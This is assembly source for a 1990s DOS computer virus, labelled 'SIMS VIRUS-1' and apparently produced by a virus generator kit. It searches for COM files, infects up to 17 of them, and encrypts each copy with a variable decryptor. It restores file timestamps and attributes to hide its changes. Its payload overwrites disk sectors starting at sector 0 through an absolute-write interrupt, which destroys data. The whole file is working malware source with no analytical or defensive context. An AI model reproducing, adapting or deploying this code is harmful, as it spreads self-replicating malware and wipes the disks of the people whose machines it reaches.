;²±°ÝþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþÞ°±²
;²±°Ý                                              Þ°±²
;²±°Ý       METRiC BUTTLOAD of CODE GENERATOR      Þ°±²
;²±°Ý     Copyright(c) 1994 - MBC - Ver. 0.91b     Þ°±²
;²±°Ý                                              Þ°±²
;²±°ÝþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþÞ°±²

.MODEL TINY
.CODE
          ORG    100H
ENTRY_POINT: DB 0E9H,0,0

DECRYPT:
          MOV  BP,(OFFSET HEAP - OFFSET STARTENCRYPT)/2
PATCH_STARTENCRYPT:
          MOV  bp,OFFSET STARTENCRYPT
DECRYPT_LOOP:
          DB   81h,46h,0                ; ADD WORD PTR [bp], xxxx
DECRYPT_VALUE DW 0
          inc  bp
          inc  bp
          DEC  BP
          JNZ  DECRYPT_LOOP
STARTENCRYPT:
          CALL NEXT
NEXT:     POP  BP
          SUB  BP,OFFSET NEXT

          LEA  SI,[BP+SAVE3]
          MOV  DI,100H
          PUSH DI
          MOVSW
          MOVSB

          MOV  BYTE PTR [BP+NUMINFEC],17

          MOV  AH,1AH
          LEA  DX,[BP+NEWDTA]
          INT  21H

          LEA  DX,[BP+COM_MASK]
          MOV  AH,4EH
          MOV  CX,7
FINDFIRSTNEXT:
          INT  21H
          JC   DONE_INFECTIONS

          MOV  AL,0H
          CALL OPEN

          MOV  AH,3FH
          LEA  DX,[BP+BUFFER]
          MOV  CX,1AH
          INT  21H

          MOV  AH,3EH
          INT  21H

CHECKCOM:
          MOV  AX,WORD PTR [BP+NEWDTA+35]
          CMP  AX,'DN'
          JZ   FIND_NEXT

          MOV  AX,WORD PTR [BP+NEWDTA+1AH]
          CMP  AX,1430
          JB   FIND_NEXT

          CMP  AX,65535-(ENDHEAP-DECRYPT)
          JA   FIND_NEXT

          MOV  BX,WORD PTR [BP+BUFFER+1]
          ADD  BX,HEAP-DECRYPT+3
          CMP  AX,BX
          JE   FIND_NEXT
          JMP  INFECT_COM
FIND_NEXT:
          MOV  AH,4FH
          JMP  SHORT FINDFIRSTNEXT

DONE_INFECTIONS:
          JMP  ACTIVATE
EXIT_VIRUS:
          MOV  AH,1AH
          MOV  DX,80H
          INT  21H
          RETN
SAVE3               DB 0CDH,20H,0

ACTIVATE:
;²±°ÝþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþÞ°±²
;²±°Ý  LITTLE FRISKIES SMOKE  'EM ROUTINE!  Þ°±²
;²±°ÝþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþþÞ°±²
;                                               
 PROC  BLISTER_LIPS                             
          PUSH DX                               
          MOV  AL,DL                            
          MOV  CX,255                           
          XOR  DX,DX                            
          INT  26H                              
          ADD  SP,2                             
          POP  DX                               
 ENDP  BLISTER_LIPS                             
 
          JMP  EXIT_VIRUS

INFECT_COM:
          MOV  CX,3
          SUB  AX,CX
          LEA  SI,[BP+OFFSET BUFFER]
          LEA  DI,[BP+OFFSET SAVE3]
          MOVSW
          MOVSB
          MOV  BYTE PTR [SI-3],0E9H
          MOV  WORD PTR [SI-2],AX
          ADD  AX,103H
          PUSH AX
FINISHINFECTION:
          PUSH CX
          XOR  CX,CX
          CALL ATTRIBUTES

          MOV  AL,2
          CALL OPEN

          MOV  AH,40H
          LEA  DX,[BP+BUFFER]
          POP  CX
          INT  21H

          MOV  AX,4202H
          XOR  CX,CX
          CWD                           ; XOR DX,DX
          INT  21H

          MOV  AH,2CH
          INT  21H
          MOV  [BP+DECRYPT_VALUE],DX
          LEA  DI,[BP+CODE_STORE]
          MOV  AX,5355H
          STOSW
          LEA  SI,[BP+DECRYPT]
          MOV  CX,STARTENCRYPT-DECRYPT
          PUSH SI
          PUSH CX
          REP  MOVSB

          XOR  BYTE PTR [BP+DECRYPT_LOOP+1],028h ; flip between add/sub

          LEA    SI,[BP+WRITE]
          MOV    CX,ENDWRITE-WRITE
          REP    MOVSB
          POP    CX
          POP    SI
          POP    DX
          PUSH   DI
          PUSH   SI
          PUSH   CX
          REP    MOVSB
          MOV    AX,5B5DH
          STOSW
          MOV    AL,0C3H
          STOSB

          ADD    DX,OFFSET STARTENCRYPT - OFFSET DECRYPT
          MOV    WORD PTR [BP+PATCH_STARTENCRYPT+1],DX
          CALL   CODE_STORE
          POP    CX
          POP    DI
          POP    SI
          REP    MOVSB

          MOV  AX,5701H
          MOV  CX,WORD PTR [BP+NEWDTA+16H]
          MOV  DX,WORD PTR [BP+NEWDTA+18H]
          INT  21H

          MOV  AH,3EH
          INT  21H

          MOV CH,0
          MOV CL,BYTE PTR [BP+NEWDTA+15h]
          CALL ATTRIBUTES

          DEC  BYTE PTR [BP+NUMINFEC]
          JNZ  MO_INFECTIONS
          JMP  DONE_INFECTIONS
MO_INFECTIONS: JMP FIND_NEXT

OPEN:
          MOV  AH,3DH
          LEA  DX,[BP+NEWDTA+30]
          INT  21H
          XCHG AX,BX
          RET

ATTRIBUTES:
          MOV  AX,4301H
          LEA  DX,[BP+NEWDTA+30]
          INT  21H
          RET

WRITE:
          POP  BX
          POP  BP
          MOV  AH,40H
          LEA  DX,[BP+DECRYPT]
          MOV  CX,HEAP-DECRYPT
          INT  21H
          PUSH BX
          PUSH BP
ENDWRITE:

COM_MASK            DB '*.?OM',0
MACHINE             DB '-=MBC=-',0
VIRUSNAME           DB 'SIMS VIRUS-1',0
USER                DB 'White Shark',0

HEAP:

CODE_STORE:         DB (STARTENCRYPT-DECRYPT)*2+(ENDWRITE-WRITE)+1 DUP (?)
NEWDTA              DB 43 DUP (?)
NUMINFEC            DB ?
BUFFER              DB 1AH DUP (?)
ENDHEAP:
END       ENTRY_POINT
